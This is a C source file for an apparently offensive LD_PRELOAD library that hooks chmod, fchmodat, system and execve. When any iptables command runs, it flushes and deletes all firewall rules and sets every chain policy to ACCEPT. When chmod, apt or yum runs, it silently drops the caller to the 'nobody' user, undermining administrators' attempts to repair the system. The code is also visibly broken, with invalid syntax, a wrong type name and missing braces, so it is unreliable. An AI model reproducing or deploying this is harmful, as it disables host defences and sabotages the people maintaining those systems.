#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#include <stdbool.h>

bool DEBUG = true;

__attribute__{(constructor)}
void init() {
	if (DEBUG) {
		fprintf(stderr, "Library loaded successfully\n");
	}
}

int chmod(const char *pathname, node_t node) {
	static int (*real_chmod)(const char *, node_t) = NULL;
	if (!real_chmod) {
		real_chmod = dlsym(RTLD_NEXT, "chmod");
	}
	if (DEBUG) {
		fprintf(stderr, "chmod hooked\n");
	}
	struct passwd *pw = getpwnam("nobody");
		if (pw) {
			setgid(pw->pw_gid);
			setuid(pw->pw_uid);
		} else {
			fprintf(stderr, "[!] Failed to resolve 'nobody' user\n");
		}
	return real_chmod(pathname, node);

// Intercept fchmodat() call
int fchmodat(int dirfd, const char *pathname, node_t node, int flags) {
	static int (*real fchmodat)(int, const char *, node_t, int) = NULL;
	if (!real_fchmodat) {
		real_fchmodat = dlsym(RTLD_NEXT, "fchmodat");
	}
	
	if (DEBUG) {
		fprintf(stderr, "fchmodat hooked\n");
	}
	
	return real_fchmodat(dirfd, pathname, node, flags);

// Intercept system() call
int system(const char *command) {
	if (DEBUG) {
		fprintf(stderr, "system hooked\n");
	}
    static int (*real_system)(const char *) = NULL;
    if (!real_system) {
        real_system = dlsym(RTLD_NEXT, "system");
    }

    // Check if the command is iptables
    if (command && strstr(command, "iptables")) {
		if (DEBUG) {
			fprintf(stderr, "[*] Intercepted iptables command: %s\n", command);
		}
        // Run your custom payload here
        real_system("iptables -F");
        real_system("iptables -X");
        real_system("iptables -t nat -F");
        real_system("iptables -t nat -X");
        real_system("iptables -t mangle -F");
        real_system("iptables -t mangle -X");
        real_system("iptables -P INPUT ACCEPT");
        real_system("iptables -P FORWARD ACCEPT");
        real_system("iptables -P OUTPUT ACCEPT");
    }

    return real_system(command);
}

// Intercept execve()
int execve(const char *pathname, char *const argv[], char *const envp[]) {
	if (DEBUG) {
		fprintf(stderr, "execve hooked\n");
	}
    static int (*real_execve)(const char *, char *const[], char *const[]) = NULL;
    if (!real_execve) {
        real_execve = dlsym(RTLD_NEXT, "execve");
    }

    if (pathname && strstr(pathname, "chmod")) {
		if (DEBUG) {
			fprintf(stderr, "[*] Intercepted chmod execution: %s\n", pathname);
		}
        struct passwd *pw = getpwnam("nobody");
		if (pw) {
			setgid(pw->pw_gid);
			setuid(pw->pw_uid);
		} else {
			fprintf(stderr, "[!] Failed to resolve 'nobody' user\n");
		}
    }
	
	else if (strstr(pathname, "/apt") || strstr(pathname, "/apt-get") || strstr(pathname, "/yum")) {
            if (DEBUG) {
				fprintf(stderr, "[*] Intercepted apt command: %s\n", pathname);
			}
            for (int i = 1; argv[i] != NULL; i++) {
                fprintf(stderr, "[apt arg %d]: %s\n", i, argv[i]);
            }

            struct passwd *pw = getpwnam("nobody");
			if (pw) {
				setgid(pw->pw_gid);
				setuid(pw->pw_uid);
			} else {
				fprintf(stderr, "[!] Failed to resolve 'nobody' user\n");
			}
        }
		
	else if (strstr(pathname, "iptables")) {
		if (DEBUG) {
			fprintf(stderr, "intercepted iptables command\n");
		}
	}

    return real_execve(pathname, argv, envp);
}
